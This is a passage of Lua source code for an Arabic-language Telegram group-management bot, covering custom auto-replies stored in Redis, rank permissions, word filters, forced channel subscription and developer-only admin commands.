photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
redis:set(bot_id.."Tshakex:Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"• تم حفظ رد بنجاح \n• ارسل ( "..test.." ) لرئية الرد")
return false  
end  
end

if redis:get(bot_id.."Tshakex:botsRedis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر اضافة صلاحيه عامه") 
local CmdDel = redis:get(bot_id.."Tshakex:botsAdd:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
redis:del(bot_id.."Tshakex:botsAdd:Validity:Group:Rt"..CmdDel..msg.chat_id_)
redis:srem(bot_id.."Tshakex:botsValiditys:Group"..msg.chat_id_,CmdDel)  
redis:del(bot_id.."Tshakex:botsRedis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_,"\n• الاستخدام خطا رتبتك اقل من منشئ \n• تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز  ، ادمن }") 
return false
end
end
if text == "ادمن" then
if not Owner(msg) then 
send(msg.chat_id_, msg.id_,"\n• الاستخدام خطا رتبتك اقل من مدير \n• تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز }") 
return false
end
end
if text == "مميز" then
if not Admin(msg) then
send(msg.chat_id_, msg.id_,"\n• الاستخدام خطا رتبتك اقل من ادمن \n• تستطيع اضافة صلاحيات الاتيه فقط ← { عضو }") 
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = redis:get(bot_id.."Tshakex:botsAdd:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
redis:set(bot_id.."Tshakex:botsAdd:Validity:Group:Rt"..textn,text)
send(msg.chat_id_, msg.id_, "\n• تم اضافة صلاحيه عامه باسم ← { "..textn..' }') 
redis:del(bot_id.."Tshakex:botsRedis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if text == "الغاء" then 
send(msg.chat_id_, msg.id_, "• تم الغاء حفظ الرد") 
redis:del(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
return false  
end 
if redis:get(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n• ارسل لي الرد لاضافته\n• تستطيع اضافة ← { ملف ، فديو ، نص ، ملصق ، بصمه ، متحركه }\n• تستطيع ايضا اضافة :\n• `#username` » معرف المستخدم \n• `#msgs` » عدد الرسائل\n• `#name` » اسم المستخدم\n• `#id` » ايدي المستخدم\n• `#stast` » موقع المستخدم \n• `#edit` » عدد السحكات ')
redis:set(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
redis:set(bot_id.."Tshakex:Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Text"..text..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Photo"..text..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Video"..text..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:File"..text..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Audio"..text..msg.chat_id_)
redis:sadd(bot_id.."Tshakex:List:Manager"..msg.chat_id_.."", text)
return false end
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if text == "الغاء" then 
send(msg.chat_id_, msg.id_, "• تم الغاء حذف الرد") 
redis:del(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
return false  
end 
if redis:get(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"• تم حذف الرد من الردود ")
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Text"..text..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Photo"..text..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Video"..text..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:File"..text..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Audio"..text..msg.chat_id_)
redis:del(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
redis:srem(bot_id.."Tshakex:List:Manager"..msg.chat_id_.."", text)
return false
end
end
------------------------------------------------------------------------------------------------------------
if text and not redis:get(bot_id.."Tshakex:Reply:Sudo"..msg.chat_id_) then
local anemi = redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Gif"..text)   
local veico = redis:get(bot_id.."Tshakex:Add:Rd:Sudo:vico"..text)   
local stekr = redis:get(bot_id.."Tshakex:Add:Rd:Sudo:stekr"..text)     
local Text = redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Text"..text)   
local photo = redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Photo"..text)
local video = redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Video"..text)
local document = redis:get(bot_id.."Tshakex:Add:Rd:Sudo:File"..text)
local audio = redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Audio"..text)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = redis:get(bot_id..'Tshakex:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Tshakex:Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_,Text)
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)     
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,"")
end  
end
if text and not redis:get(bot_id.."Tshakex:Reply:Manager"..msg.chat_id_) then
if not redis:sismember(bot_id..'Tshakex:Spam_For_Bot'..msg.sender_user_id_,text) then
local anemi = redis:get(bot_id.."Tshakex:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = redis:get(bot_id.."Tshakex:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = redis:get(bot_id.."Tshakex:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local Text = redis:get(bot_id.."Tshakex:Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = redis:get(bot_id.."Tshakex:Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = redis:get(bot_id.."Tshakex:Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = redis:get(bot_id.."Tshakex:Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = redis:get(bot_id.."Tshakex:Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = redis:get(bot_id..'Tshakex:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Tshakex:Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_, Text)
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr)
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)   
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,photo_caption)
end  
end
end
------------------------------------------------------------------------------------------------------------
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = redis:get(bot_id.."Tshakex:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if redis:get(bot_id.."Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
redis:del(bot_id.."Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
redis:set(bot_id.."Tshakex:Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
redis:set(bot_id.."Tshakex:Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
redis:set(bot_id.."Tshakex:Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."Tshakex:Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
redis:set(bot_id.."Tshakex:Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
redis:set(bot_id.."Tshakex:Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
redis:set(bot_id.."Tshakex:Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
redis:set(bot_id.."Tshakex:Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"• تم حفظ رد \n• ارسل ( "..test.." ) لرئية الرد")
return false  
end  
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n• ارسل لي الكلمه الان \n• تستطيع اضافة ← { ملف ، فديو ، نص ، ملصق ، بصمه ، متحركه }\n• تستطيع ايضا اضافة :\n• `#username` » معرف المستخدم \n• `#msgs` » عدد الرسائل\n• `#name` » اسم المستخدم\n• `#id` » ايدي المستخدم\n• `#stast` » موقع المستخدم \n• `#edit` » عدد السحكات ')
redis:set(bot_id.."Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
redis:set(bot_id.."Tshakex:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
redis:sadd(bot_id.."Tshakex:List:Rd:Sudo", text)
return false end
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Tshakex:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"• تم حذف الرد من الردود العامه ")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
redis:del(bot_id..'Tshakex:'..v..text)
end
redis:del(bot_id.."Tshakex:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
redis:srem(bot_id.."Tshakex:List:Rd:Sudo", text)
return false
end
end
if redis:get(bot_id.."Tshakex:Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_, msg.id_, "• تم الغاء حفظ القوانين") 
redis:del(bot_id.."Tshakex:Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
redis:set(bot_id.."Tshakex::Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"• تم حفظ قوانين المجموعه") 
redis:del(bot_id.."Tshakex:Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
if redis:get(bot_id.."Tshakex:Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == "الغاء" then 
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر تغير وصف المجموعه") 
redis:del(bot_id.."Tshakex:Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
redis:del(bot_id.."Tshakex:Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request("https://api.telegram.org/bot"..token.."/setChatDescription?chat_id="..msg.chat_id_.."&description="..text) 
send(msg.chat_id_, msg.id_,"• تم تغير وصف المجموعه")   
return false  
end 
--------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر حفظ الترحيب") 
redis:del(bot_id.."Tshakex:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Tshakex:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
redis:set(bot_id.."Tshakex:Get:Welcome:Group"..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"• تم حفظ ترحيب المجموعه")   
return false   
end
--------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:link:set"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر حفظ الرابط") 
redis:del(bot_id.."Tshakex:link:set"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
redis:set(bot_id.."Tshakex:link:set:Group"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"• تم حفظ الرابط بنجاح")       
redis:del(bot_id.."Tshakex:link:set"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
if text then 
local DelFilter = redis:get(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if DelFilter and DelFilter == "DelFilter" then   
send(msg.chat_id_, msg.id_,"• تم الغاء منعها ")  
redis:del(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
redis:del(bot_id.."Tshakex:Filter:Reply2"..text..msg.chat_id_)  
redis:srem(bot_id.."Tshakex:List:Filter"..msg.chat_id_,text)  
return false 
end  
end
------------------------------------------------------------------------------------------------------------
if text then   
local SetFilter = redis:get(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if SetFilter and SetFilter == "SetFilter" then   
send(msg.chat_id_, msg.id_,"• ارسل التحذير عند ارسال الكلمه")  
redis:set(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_,"WirngFilter")  
redis:set(bot_id.."Tshakex:Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_, text)  
redis:sadd(bot_id.."Tshakex:List:Filter"..msg.chat_id_,text)  
return false  
end  
end
------------------------------------------------------------------------------------------------------------
if text then  
local WirngFilter = redis:get(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if WirngFilter and WirngFilter == "WirngFilter" then  
send(msg.chat_id_, msg.id_,"• تم منع الكلمه مع التحذير")  
redis:del(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
local test = redis:get(bot_id.."Tshakex:Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_)  
if text then   
redis:set(bot_id.."Tshakex:Filter:Reply2"..test..msg.chat_id_, text)  
end  
redis:del(bot_id.."Tshakex:Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_)  
return false 
end  
end
if redis:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "• تم الغاء الامر ") 
redis:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
redis:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '• المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '• عذا لا يمكنك وضع معرف حسابات في الاشتراك ') 
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'• عذا لا يمكنك وضع معرف مجوعه في الاشتراك ') 
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'• البوت ادمن في القناة \n تم تفعيل الاشتراك الاجباري في \n ايدي القناة ('..data.id_..')\n• معرف القناة ([@'..data.type_.channel_.username_..'])') 
redis:set(bot_id..'add:ch:id',data.id_)
redis:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,'• البوت ليس ادمن في القناة يرجى ترقيته ادمن ثم اعادة المحاوله ') 
end
return false  
end
end,nil)
end
if redis:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "• تم الغاء الامر ") 
redis:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
redis:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
redis:set(bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,' تم تغير رسالة الاشتراك بنجاح ')
end
---------------------------------------------------
if TypeForChat == ("ForUser") then
if text == '/start' or text == 'العوده' then  
if Dev_Bots(msg) then
local Text_keyboard = '• اهلا بك عزيزي المطور الاساسي \n في اوامرك الخاصه \n يمكنك تحكم في بوت عن طريق كيبورد ادناه '
local List_keyboard = {
{'تغير اسم البوت'},
{'الاحصائيات'},
{'تفعيل تواصل','تعطيل تواصل'},
{'الاذاعه'},
{'مسح قائمة C','مسح قائمة CM'},
{'مسح المكتومين عام','مسح قائمة العام'},
{'اضف سوال كت تويت','حذف سوال كت تويت'},
{'حذف سوال مقالات','اضف سوال مقالات'},
{'حذف الايدي عام','تعين الايدي عام'},
{'تعطيل الاشتراك','تفعيل الاشتراك '},
{'تغير الاشتراك ','الاشتراك الاجباري'},
{'تفعيل البوت الخدمي','تعطيل البوت الخدمي'},
{'مسح المجموعات','مسح المشتركين'},
{'ازالة كليشه ستارت','تغير كليشه ستارت'},
{'تحديث','تحديث السورس'},
{'جلب نسخه'},
{'الغاء'}
}
send_inline_keyboard(msg.chat_id_,Text_keyboard,List_keyboard)
else
if not redis:get(bot_id..'Tshakex:Ban:Cmd:Start'..msg.sender_user_id_) then
local GetCmdStart = redis:get(bot_id.."Tshakex:Set:Cmd:Start:Bot")  
if not GetCmdStart then 
CmdStart = '\n• اهلا بك عزيزي \n انا بوت اسمي '..(redis:get(bot_id.."Tshakex:Redis:Name:Bot") or "نايت رانج")..''..
'\n• اختصاص البوت حماية المجموعات'..
'\n• لتفعيل البوت عليك اتباع مايلي ...'..
'\n• اضف البوت الى مجموعتك'..
'\n• ارفعه مشرف'..
'\n• ارسل كلمة  تفعيل  ليتم تفعيل المجموعه'..
'\n• سيتم ترقيتك منشئ اساسي في البوت'..
'\n• معرف المطور الاساسي ← [@'..UserName_Dev..']'
send(msg.chat_id_, msg.id_,CmdStart) 
else
send(msg.chat_id_, msg.id_,GetCmdStart) 
end 
end
end
redis:setex(bot_id..'Tshakex:Ban:Cmd:Start'..msg.sender_user_id_,60,true)
return false
end
if not Dev_Bots(msg) and not redis:sismember(bot_id..'Tshakex:User:Ban:Pv',msg.sender_user_id_) and not redis:get(bot_id..'Tshakex:Lock:Twasl') then
send(msg.sender_user_id_,msg.id_,'• تم ارسال رسالتك \n معرف ال المطور الاساسي  ←  [@'..UserName_Dev..'] ')    
local List_id = {Id_Dev,msg.sender_user_id_}
for k,v in pairs(List_id) do   
tdcli_function({ID="GetChat",chat_id_=v},function(arg,chat) end,nil)
end
tdcli_function({ID="ForwardMessages",chat_id_=Id_Dev,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
Send_Optionspv(Id_Dev,0,msg.sender_user_id_,"reply_Pv","• قام بارسال الملصق")  
return false
end
end
end,nil)
end
if Dev_Bots(msg) then 
if msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
UserForward = result.forward_info_.sender_user_id_    
end     
if text == 'حظر' then
redis:sadd(bot_id..'Tshakex:User:Ban:Pv',UserForward)  
Send_Optionspv(Id_Dev,msg.id_,UserForward,"reply_Pv","• تم حظره من تواصل البوت")  
return false  
end
if text =='الغاء الحظر' then
redis:srem(bot_id..'Tshakex:User:Ban:Pv',UserForward) 
Send_Optionspv(Id_Dev,msg.id_,UserForward,"reply_Pv","• تم الغاء الحظره من تواصل البوت")   
return false  
end 
tdcli_function({ID='GetChat',chat_id_=UserForward},function(a,s) end,nil)
tdcli_function({ID="SendChatAction",chat_id_=UserForward,action_={ID="SendMessageTypingAction",progress_=100}},function(arg,Get_Status) 
if (Get_Status.code_) == (400) or (Get_Status.code_) == (5) then
Send_Optionspv(Id_Dev,msg.id_,UserForward,"reply_Pv","• قام بحظر البوت لا تستطيع ارسال له رسائل")  
return false  
end 
if text then    
send(UserForward,msg.id_,text)    
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(UserForward, msg.id_, msg.content_.sticker_.sticker_.persistent_id_)   
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(UserForward, msg.id_,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(UserForward, msg.id_, msg.content_.animation_.animation_.persistent_id_)    
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(UserForward, msg.id_, msg.content_.voice_.voice_.persistent_id_)    
end     
Send_Optionspv(Id_Dev,msg.id_,UserForward,"reply_Pv","• تم ارسال رسالتك اليه بنجاح")  
end,nil)end,nil)
end
if text == "تحديث" then
dofile("Tshakex.lua")  
dofile("Info_Sudo.lua") 
send(msg.chat_id_, msg.id_, "تم تحديث ملفات البوت")
end
if text == 'الاذاعه' then  
local Text_keyboard = '• اهلا بك عزيزي المطور الاساسي \n في اوامر الاذاعه'
local List_keyboard = {
{'اذاعه خاص','اذاعه للمجموعات'},
{'اذاعه خاص بالتوجيه','اذاعه بالتوجيه'},
{'العوده'}
}
send_inline_keyboard(msg.chat_id_,Text_keyboard,List_keyboard)
end
if text == 'تعين الايدي عام' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:setex(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
send(msg.chat_id_, msg.id_,[[
܁يمكنك اضافة ܊
▹ `#username` - ܁ اسم المستخدم
▹ `#msgs` - ܁ عدد رسائل المستخدم
▹ `#photos` - ܁ عدد صور المستخدم
▹ `#id` - ܁ ايدي المستخدم
▹ `#stast` - ܁ رتبة المستخدم
▹ `#edit` - ܁ عدد تعديلات 
▹ `#game` - ܁ نقاط
]])
return false  
end
if text == 'تحديث السورس' and Dev_Bots(msg) then
download_to_file('https://raw.githubusercontent.com/TEAMTshakeXX/Tshake/master/Tshakex.lua','Tshakex.lua') 
send(msg.chat_id_, msg.id_, "🔂┇تم تحديث السورس وتنزيل اخر تحديث للملفات")
end
if redis:get(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"܁تم الغاء تعين الايدي") 
redis:del(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
redis:del(bot_id.."CHENG:ID:bot"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
redis:set(bot_id.."KLISH:ID:bot",CHENGER_ID)
send(msg.chat_id_, msg.id_,'܁تم تعين الايدي بنجاح')    
end
if text == 'حذف الايدي عام' or text == 'مسح الايدي عام' then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id.."KLISH:ID:bot")
send(msg.chat_id_, msg.id_, '܁ تم ازالة كليشة الايدي ')
return false  
end 
if text and text:match("^تغير الاشتراك$") then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '• حسنا ارسل لي معرف القناة') 
return false  
end
if text and text:match("^تغير رساله الاشتراك$") then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '• حسنا ارسل لي النص الذي تريده') 
return false  
end
if text == "حذف رساله الاشتراك" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "• تم مسح رساله الاشتراك ") 
return false  
end
if text and text:match("^وضع قناة الاشتراك$") then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '• حسنا ارسل لي معرف القناة') 
return false  
end
if text == "تفعيل الاشتراك" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
if redis:get(bot_id..'add:ch:id') then
local addchusername = redis:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_,"• الاشتراك الاجباري مفعل \n على القناة ⇠ ["..addchusername.."]")
else
redis:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," لا يوجد قناة للاشتراك الاجباري")
end
return false  
end
if text == "تعطيل الاشتراك" then
if not Dev_Bots(msg) then
send(msg.chat_id_,msg.id_,' هذا الامر خاص المطور الاساسي فقط')
return false
end
redis:del(bot_id..'add:ch:id')
redis:del(bot_id..'add:ch:username')
